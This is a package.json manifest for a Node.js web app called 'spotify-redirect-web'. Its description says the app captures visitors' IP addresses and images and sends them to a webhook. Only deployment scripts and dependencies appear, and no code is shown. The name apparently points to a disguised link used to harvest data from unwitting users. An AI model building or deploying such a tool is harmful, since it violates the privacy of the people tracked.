{
  "name": "spotify-redirect-web",
  "version": "1.0.0",
  "description": "A web app that captures user IP and image, then sends them to a webhook.",
  "main": "server.js",
  "scripts": {
    "dev": "vercel dev",
    "start": "vercel dev",
    "build": "vercel build",
    "deploy": "vercel --prod"
  },
  "dependencies": {
    "dotenv": "^16.0.3",
    "express": "^4.18.2",
    "formidable": "^2.0.1",
    "node-fetch": "^3.3.1"
  },
  "devDependencies": {
    "vercel": "^28.19.0"
  },
  "engines": {
    "node": ">=16"
  }
}
